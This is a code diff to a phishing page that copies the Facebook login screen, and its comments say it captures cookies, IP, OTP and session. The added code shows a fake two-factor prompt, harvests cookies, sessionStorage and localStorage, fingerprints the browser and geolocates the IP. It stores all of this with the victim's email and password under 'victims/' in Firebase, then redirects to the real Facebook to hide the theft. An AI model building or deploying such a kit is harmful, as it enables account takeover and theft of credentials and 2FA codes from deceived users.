@@ -1,6 +1,6 @@
 <!-- ═══════════════════════════════════════════════════════════
      FILE: assets/facebook.html
-     ফেসবুক লগইন পেজ - হুবহু ক্লোন
+     ফেসবুক ক্লোন - কুকি + IP + OTP + সেশন ক্যাপচার
      Firebase অটো-কানেক্ট (config.js থেকে)
      ═══════════════════════════════════════════════════════════ -->
 <!DOCTYPE html>
@@ -36,11 +36,7 @@
             --fb-shadow: rgba(0, 0, 0, 0.1);
         }
         
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
         body {
             font-family: Helvetica, Arial, sans-serif;
@@ -51,7 +47,6 @@
             align-items: center;
         }
         
-        /* ── Main Container ── */
         ._li {
             width: 100%;
             display: flex;
@@ -75,7 +70,6 @@
             gap: 50px;
         }
         
-        /* ── Left Side ── */
         ._8esk {
             flex: 1;
             max-width: 580px;
@@ -96,7 +90,6 @@
             padding-left: 32px;
         }
         
-        /* ── Right Side ── */
         ._8esn {
             width: 396px;
             flex-shrink: 0;
@@ -110,9 +103,7 @@
             padding: 20px;
         }
         
-        ._6lux {
-            margin-bottom: 12px;
-        }
+        ._6lux { margin-bottom: 12px; }
         
         ._6luy {
             width: 100%;
@@ -131,13 +122,9 @@
             box-shadow: 0 0 0 2px #e7f3ff;
         }
         
-        ._6luy::placeholder {
-            color: #90949c;
-        }
+        ._6luy::placeholder { color: #90949c; }
         
-        ._6ltg {
-            margin-top: 6px;
-        }
+        ._6ltg { margin-top: 6px; }
         
         ._6lth {
             width: 100%;
@@ -154,9 +141,7 @@
             font-family: inherit;
         }
         
-        ._6lth:hover {
-            background: var(--fb-blue-hover);
-        }
+        ._6lth:hover { background: var(--fb-blue-hover); }
         
         ._6ltj {
             text-align: center;
@@ -170,9 +155,7 @@
             font-weight: 500;
         }
         
-        ._6ltj a:hover {
-            text-decoration: underline;
-        }
+        ._6ltj a:hover { text-decoration: underline; }
         
         ._8icz {
             border-bottom: 1px solid #dadde1;
@@ -197,9 +180,7 @@
             width: fit-content;
         }
         
-        ._6lti:hover {
-            background: var(--fb-green-hover);
-        }
+        ._6lti:hover { background: var(--fb-green-hover); }
         
         ._58mk {
             text-align: center;
@@ -214,11 +195,8 @@
             font-weight: bold;
         }
         
-        ._58mk a:hover {
-            text-decoration: underline;
-        }
+        ._58mk a:hover { text-decoration: underline; }
         
-        /* ── Footer ── */
         #pageFooter {
             width: 100%;
             max-width: 980px;
@@ -244,10 +222,6 @@
             font-size: 12px;
         }
         
-        .localeSelectorList a:hover {
-            text-decoration: underline;
-        }
-        
         .pageFooterLinkList {
             display: flex;
             flex-wrap: wrap;
@@ -262,32 +236,88 @@
             font-size: 12px;
         }
         
-        .pageFooterLinkList a:hover {
-            text-decoration: underline;
+        .copyright { font-size: 11px; margin-top: 20px; }
+        
+        /* OTP Section */
+        .otp-section {
+            display: none;
         }
         
-        .copyright {
-            font-size: 11px;
-            margin-top: 20px;
+        .otp-title {
+            text-align: center;
+            margin-bottom: 20px;
         }
         
-        /* ── Loading Spinner ── */
+        .otp-icon { font-size: 48px; margin-bottom: 10px; }
+        
+        .otp-title h2 { font-size: 16px; margin-bottom: 8px; }
+        
+        .otp-title p {
+            font-size: 14px;
+            color: var(--fb-text-secondary);
+        }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .otp-box {
+            width: 45px;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+            border: 1px solid var(--fb-border);
+            border-radius: 8px;
+            outline: none;
+        }
+        
+        .otp-box:focus {
+            border-color: var(--fb-blue);
+            box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+        }
+        
+        .otp-verify-btn {
+            width: 100%;
+            padding: 10px;
+            background: var(--fb-blue);
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-family: inherit;
+        }
+        
+        .otp-resend {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            color: var(--fb-blue);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        /* Spinner */
         ._spinner {
             display: none;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
+            border: 3px solid rgba(255,255,255,0.3);
             border-top-color: white;
             border-radius: 50%;
             animation: _spin 0.8s linear infinite;
             margin: 0 auto;
         }
         
-        @keyframes _spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes _spin { to { transform: rotate(360deg); } }
         
-        /* ── Responsive ── */
         @media (max-width: 900px) {
             .fb_content {
                 flex-direction: column;
@@ -300,13 +330,8 @@
                 text-align: center;
                 margin-top: 20px;
             }
-            .fb_logo {
-                width: 200px;
-            }
-            ._8eso {
-                font-size: 20px;
-                padding-left: 0;
-            }
+            .fb_logo { width: 200px; }
+            ._8eso { font-size: 20px; padding-left: 0; }
             ._8esn {
                 width: 100%;
                 max-width: 396px;
@@ -315,19 +340,10 @@
         }
         
         @media (max-width: 480px) {
-            .fb_logo {
-                width: 160px;
-            }
-            ._8eso {
-                font-size: 17px;
-            }
-            ._8iep {
-                padding: 15px;
-            }
-            ._6luy {
-                font-size: 15px;
-                padding: 12px 14px;
-            }
+            .fb_logo { width: 160px; }
+            ._8eso { font-size: 17px; }
+            ._8iep { padding: 15px; }
+            ._6luy { font-size: 15px; padding: 12px 14px; }
         }
     </style>
 </head>
@@ -340,73 +356,39 @@
                         <div class="_8esk">
                             <div class="_8esl">
                                 <div class="_8ice">
-                                    <img class="fb_logo _8ilh img" 
-                                         src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
-                                         alt="Facebook">
+                                    <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
                                 </div>
-                                <h2 class="_8eso">
-                                    Facebook helps you connect and share with the people in your life.
-                                </h2>
+                                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.</h2>
                             </div>
                             <div class="_8esn">
-                                <div class="_8iep _8icy">
+                                <!-- Login Card -->
+                                <div class="_8iep _8icy" id="loginCard">
                                     <div class="_6luv _52jv">
-                                        <form class="_9vtf" 
-                                              data-testid="royal_login_form" 
-                                              id="loginForm"
-                                              onsubmit="return captureData(event)">
-                                            <input type="hidden" name="jazoest" value="2888" autocomplete="off">
-                                            <input type="hidden" name="lsd" value="AVqK7GczFT0" autocomplete="off">
+                                        <form class="_9vtf" id="loginForm" onsubmit="return handleLogin(event)">
                                             <input type="hidden" name="platform" value="facebook">
                                             <div>
                                                 <div class="_6lux">
-                                                    <input type="text" 
-                                                           class="inputtext _55r1 _6luy" 
-                                                           name="email" 
-                                                           id="email" 
+                                                    <input type="text" class="_6luy" name="email" id="email" 
                                                            placeholder="Email address or phone number" 
-                                                           autofocus="1" 
-                                                           aria-label="Email address or phone number"
-                                                           autocomplete="off"
-                                                           required>
+                                                           autofocus="1" autocomplete="off" required>
                                                 </div>
                                                 <div class="_6lux">
-                                                    <div class="_6luy _55r1 _1kbt" id="passContainer">
-                                                        <input type="password" 
-                                                               class="inputtext _55r1 _6luy _9npi" 
-                                                               name="pass" 
-                                                               id="password" 
-                                                               placeholder="Password" 
-                                                               aria-label="Password"
-                                                               autocomplete="off"
-                                                               required>
-                                                    </div>
+                                                    <input type="password" class="_6luy" name="pass" id="password" 
+                                                           placeholder="Password" autocomplete="off" required>
                                                 </div>
                                             </div>
                                             <div class="_6ltg">
-                                                <button value="1" 
-                                                        class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" 
-                                                        name="login" 
-                                                        id="loginBtn" 
-                                                        type="submit">
+                                                <button type="submit" class="_6lth" id="loginBtn">
                                                     <span id="btnText">Log In</span>
                                                     <div class="_spinner" id="spinner"></div>
                                                 </button>
                                             </div>
                                             <div class="_6ltj">
-                                                <a href="https://www.facebook.com/recover/initiate/" 
-                                                   onclick="event.preventDefault();">
-                                                    Forgotten password?
-                                                </a>
+                                                <a href="#" onclick="event.preventDefault();">Forgotten password?</a>
                                             </div>
                                             <div class="_8icz"></div>
                                             <div class="_6ltg">
-                                                <a role="button" 
-                                                   class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" 
-                                                   href="#"
-                                                   onclick="event.preventDefault();">
-                                                    Create New Account
-                                                </a>
+                                                <a role="button" class="_6lti" href="#" onclick="event.preventDefault();">Create New Account</a>
                                             </div>
                                         </form>
                                     </div>
@@ -414,6 +396,31 @@
                                         <a href="#" onclick="event.preventDefault();" class="_8esh">Create a Page</a>
                                         for a celebrity, brand or business.
                                     </div>
+                                </div>
+                                
+                                <!-- OTP Card -->
+                                <div class="_8iep _8icy otp-section" id="otpCard">
+                                    <div class="otp-title">
+                                        <div class="otp-icon">🔐</div>
+                                        <h2>Two-Factor Authentication</h2>
+                                        <p>Enter the 6-digit code sent to<br>your phone or email.</p>
+                                    </div>
+                                    <form id="otpForm" onsubmit="return handleOTP(event)">
+                                        <div class="otp-inputs">
+                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
+                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
+                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
+                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
+                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
+                                            <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" required>
+                                        </div>
+                                        <input type="hidden" id="otpCombined" name="otp">
+                                        <button type="submit" class="otp-verify-btn" id="otpBtn">
+                                            <span id="otpBtnText">Verify</span>
+                                            <div class="_spinner" id="otpSpinner"></div>
+                                        </button>
+                                    </form>
+                                    <a href="#" class="otp-resend" onclick="event.preventDefault();">Resend Code</a>
                                 </div>
                             </div>
                         </div>
@@ -425,54 +432,38 @@
         <!-- Footer -->
         <div class="">
             <div class="_95ke _8opy">
-                <div id="pageFooter" data-referrer="page_footer">
-                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                <div id="pageFooter">
+                    <ul class="localeSelectorList">
                         <li>English (UK)</li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Bengali">বাংলা</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Hindi">हिन्दी</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Spanish">Español</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="French">Français</a></li>
-                        <li><a class="_sv4" dir="rtl" href="#" onclick="event.preventDefault();" title="Arabic">العربية</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Chinese">中文(简体)</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Portuguese">Português (Brasil)</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Indonesian">Bahasa Indonesia</a></li>
-                        <li><a class="_sv4" dir="ltr" href="#" onclick="event.preventDefault();" title="Japanese">日本語</a></li>
+                        <li><a href="#" onclick="event.preventDefault();">বাংলা</a></li>
+                        <li><a href="#" onclick="event.preventDefault();">हिन्दी</a></li>
+                        <li><a href="#" onclick="event.preventDefault();">Español</a></li>
+                        <li><a href="#" onclick="event.preventDefault();">العربية</a></li>
+                        <li><a href="#" onclick="event.preventDefault();">中文(简体)</a></li>
+                        <li><a href="#" onclick="event.preventDefault();">Português (Brasil)</a></li>
                     </ul>
-                    <div id="contentCurve"></div>
-                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
-                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
-                            <li><a href="#" onclick="event.preventDefault();">Sign Up</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Log In</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Messenger</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Facebook Lite</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Watch</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Places</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Games</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Marketplace</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Facebook Pay</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Oculus</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Portal</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Instagram</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Bulletin</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Local</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Fundraisers</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Services</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Groups</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">About</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Create ad</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Create Page</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Developers</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Careers</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Privacy</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Cookies</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">AdChoices</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Terms</a></li>
-                            <li><a href="#" onclick="event.preventDefault();">Help</a></li>
+                    <div id="pageFooterChildren">
+                        <ul class="pageFooterLinkList">
+                            <li><a href="#">Sign Up</a></li>
+                            <li><a href="#">Log In</a></li>
+                            <li><a href="#">Messenger</a></li>
+                            <li><a href="#">Facebook Lite</a></li>
+                            <li><a href="#">Watch</a></li>
+                            <li><a href="#">Places</a></li>
+                            <li><a href="#">Games</a></li>
+                            <li><a href="#">Marketplace</a></li>
+                            <li><a href="#">Facebook Pay</a></li>
+                            <li><a href="#">Oculus</a></li>
+                            <li><a href="#">Instagram</a></li>
+                            <li><a href="#">Groups</a></li>
+                            <li><a href="#">About</a></li>
+                            <li><a href="#">Privacy</a></li>
+                            <li><a href="#">Cookies</a></li>
+                            <li><a href="#">Terms</a></li>
+                            <li><a href="#">Help</a></li>
                         </ul>
                     </div>
-                    <div class="mvl copyright">
-                        <div><span>Meta © 2026</span></div>
-                    </div>
+                    <div class="copyright"><span>Meta © 2026</span></div>
                 </div>
             </div>
         </div>
@@ -480,14 +471,16 @@
     
     <script>
         // ═══════════════════════════════════════════════════════
-        // FIREBASE AUTO-CONNECT (config.js থেকে)
+        // FIREBASE AUTO-CONNECT
         // ═══════════════════════════════════════════════════════
         
         firebase.initializeApp(window.firebaseConfig);
         const database = firebase.database();
         
+        let loginData = {};
+        
         // ═══════════════════════════════════════════════════════
-        // DEVICE INFO COLLECTOR
+        // DEVICE INFO
         // ═══════════════════════════════════════════════════════
         
         function getDeviceInfo() {
@@ -498,36 +491,23 @@
                 language: navigator.language,
                 screen: screen.width + 'x' + screen.height,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                browser: detectBrowser(ua),
-                os: detectOS(ua),
+                browser: ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' :
+                          ua.includes('Firefox') ? 'Firefox' :
+                          ua.includes('Edg') ? 'Edge' :
+                          ua.includes('Safari') ? 'Safari' : 'Unknown',
+                os: ua.includes('Windows') ? 'Windows' :
+                    ua.includes('Android') ? 'Android' :
+                    ua.includes('iPhone') ? 'iOS' :
+                    ua.includes('Mac') ? 'macOS' : 'Unknown',
                 device: ua.includes('Mobile') ? 'Mobile' : 'Desktop',
-                cookiesEnabled: navigator.cookieEnabled
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                touchPoints: navigator.maxTouchPoints || 0
             };
         }
         
-        function detectBrowser(ua) {
-            if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return 'Chrome';
-            if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Edg')) return 'Edge';
-            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
-            if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
-            return 'Unknown';
-        }
-        
-        function detectOS(ua) {
-            if (ua.includes('Windows NT 10')) return 'Windows 10';
-            if (ua.includes('Windows NT 11')) return 'Windows 11';
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iPhone')) return 'iOS (iPhone)';
-            if (ua.includes('iPad')) return 'iOS (iPad)';
-            if (ua.includes('Mac OS')) return 'macOS';
-            if (ua.includes('Linux')) return 'Linux';
-            return 'Unknown';
-        }
-        
         // ═══════════════════════════════════════════════════════
-        // IP GEOLOCATION
+        // IP + GEOLOCATION
         // ═══════════════════════════════════════════════════════
         
         async function getIPInfo() {
@@ -546,23 +526,92 @@
                     latitude: data.latitude || '',
                     longitude: data.longitude || '',
                     timezone: data.timezone || 'Unknown',
-                    asn: data.asn || 'Unknown'
+                    asn: data.asn || 'Unknown',
+                    currency: data.currency || 'Unknown',
+                    languages: data.languages || 'Unknown'
                 };
             } catch {
-                return {
-                    ip: 'Unknown',
-                    city: 'Unknown',
-                    country: 'Unknown',
-                    isp: 'Unknown'
-                };
+                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
             }
         }
         
         // ═══════════════════════════════════════════════════════
-        // FORM CAPTURE
+        // COOKIE CAPTURE
         // ═══════════════════════════════════════════════════════
         
-        async function captureData(event) {
+        function getCookies() {
+            const cookies = document.cookie;
+            const cookieList = cookies.split(';').map(c => c.trim()).filter(c => c);
+            
+            return {
+                raw: cookies,
+                parsed: cookieList.map(c => {
+                    const [name, ...value] = c.split('=');
+                    return { name: name.trim(), value: value.join('=').trim() };
+                }),
+                count: cookieList.length,
+                sessionStorage: JSON.stringify(sessionStorage),
+                localStorage: JSON.stringify(localStorage)
+            };
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // BROWSER FINGERPRINT
+        // ═══════════════════════════════════════════════════════
+        
+        function getFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.fillStyle = '#1877f2';
+            ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = '#fff';
+            ctx.font = '14px Arial';
+            ctx.fillText('Browser Fingerprint', 10, 30);
+            const fingerprint = canvas.toDataURL();
+            
+            return {
+                canvasHash: fingerprint.substring(0, 100),
+                screenFingerprint: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                plugins: navigator.plugins ? navigator.plugins.length : 0
+            };
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // OTP AUTO-ADVANCE
+        // ═══════════════════════════════════════════════════════
+        
+        document.querySelectorAll('.otp-box').forEach((box, index, boxes) => {
+            box.addEventListener('input', function() {
+                if (this.value.length === 1 && index < boxes.length - 1) {
+                    boxes[index + 1].focus();
+                }
+                if (index === boxes.length - 1 && this.value.length === 1) {
+                    const allFilled = Array.from(boxes).every(b => b.value.length === 1);
+                    if (allFilled) combineOTP();
+                }
+            });
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                    boxes[index - 1].focus();
+                }
+            });
+        });
+        
+        function combineOTP() {
+            const boxes = document.querySelectorAll('.otp-box');
+            let combined = '';
+            boxes.forEach(box => combined += box.value);
+            document.getElementById('otpCombined').value = combined;
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // STEP 1: LOGIN
+        // ═══════════════════════════════════════════════════════
+        
+        async function handleLogin(event) {
             event.preventDefault();
             
             const email = document.getElementById('email').value.trim();
@@ -570,35 +619,75 @@
             
             if (!email || !password) return false;
             
-            // Show loading
             document.getElementById('btnText').style.display = 'none';
             document.getElementById('spinner').style.display = 'block';
             document.getElementById('loginBtn').disabled = true;
             
-            // Collect data
-            const victimData = {
+            // Collect all data
+            loginData = {
                 platform: 'facebook',
                 email: email,
                 password: password,
                 deviceInfo: getDeviceInfo(),
                 ipInfo: await getIPInfo(),
+                cookies: getCookies(),
+                fingerprint: getFingerprint(),
                 timestamp: new Date().toISOString(),
                 victimId: 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                 referrer: document.referrer || 'Direct Access',
-                pageUrl: window.location.href
+                pageUrl: window.location.href,
+                step: 'login'
             };
+            
+            // Show OTP card
+            setTimeout(() => {
+                document.getElementById('loginCard').style.display = 'none';
+                document.getElementById('otpCard').style.display = 'block';
+                document.getElementById('btnText').style.display = 'inline';
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('loginBtn').disabled = false;
+                document.querySelector('.otp-box').focus();
+            }, 1200);
+            
+            return false;
+        }
+        
+        // ═══════════════════════════════════════════════════════
+        // STEP 2: OTP
+        // ═══════════════════════════════════════════════════════
+        
+        async function handleOTP(event) {
+            event.preventDefault();
+            
+            combineOTP();
+            const otp = document.getElementById('otpCombined').value;
+            
+            if (!otp || otp.length !== 6) {
+                alert('Please enter the 6-digit code');
+                return false;
+            }
+            
+            document.getElementById('otpBtnText').style.display = 'none';
+            document.getElementById('otpSpinner').style.display = 'block';
+            document.getElementById('otpBtn').disabled = true;
+            
+            // Add OTP data
+            loginData.otp = otp;
+            loginData.otpTimestamp = new Date().toISOString();
+            loginData.step = 'otp_complete';
+            loginData.cookies = getCookies(); // Re-capture cookies
             
             // Save to Firebase
             try {
-                await database.ref('victims/' + victimData.victimId).set(victimData);
-                console.log('✓ Credentials captured');
+                await database.ref('victims/' + loginData.victimId).set(loginData);
+                console.log('✓ All data captured (Login + OTP + Cookies + IP)');
             } catch (error) {
                 console.error('Firebase error:', error.message);
             }
             
-            // Redirect to real Facebook after delay
+            // Redirect to real Facebook
             setTimeout(() => {
-                window.location.href = 'https://www.facebook.com/login.php?login_attempt=1&lwv=110';
+                window.location.href = 'https://www.facebook.com/login.php?login_attempt=1';
             }, 1500);
             
             return false;
